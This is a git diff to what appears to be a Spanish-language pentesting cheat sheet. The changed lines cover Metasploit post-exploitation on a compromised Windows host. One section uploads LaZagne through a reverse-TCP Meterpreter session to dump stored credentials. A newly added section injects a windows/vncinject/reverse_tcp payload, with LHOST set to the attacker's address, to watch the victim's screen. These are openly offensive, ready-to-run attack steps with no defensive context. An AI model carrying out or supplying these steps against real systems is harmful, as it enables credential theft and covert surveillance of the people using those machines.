@@ -507,10 +507,28 @@ rmdir <nombre directorio> (Borrar directorio)
 ++ Lazagne 
 --- URL: https://github.com/AlessandroZ/LaZagne
 --- Navegar al directorio del programa
---- meterpreter> upload Windows/laZagne.exe (Manda el archivo desde kali al equipo con Windows)
+--- meterpreter> upload Windows/laZagne.exe (Manda el archivo desde kali al equipo con Windows) (se debe tener ya una sesion abierta con el ataque reverse tcp)
 --- shell
 --- lazagne.exe all
 --- Se nos mostrarán las credenciales alojadas en el equipo Windows 
+
+++ Capturar Sesion VNC
+--- msfconsole
+--- meterpreter
+--- run
+--- meterpreter > background (se debe tener ya una sesion abierta con el ataque reverse tcp)
+--- use windows/manage/payload_inject
+--- set payload windows/vncinject/reverse_tcp
+--- set LHOST <ip_local>
+--- set session 1
+--- set handler true
+--- run
+--- A este punto es posible ver lo que se está haciendo en la pc con windows
+
+
+
+
+
 
 
 
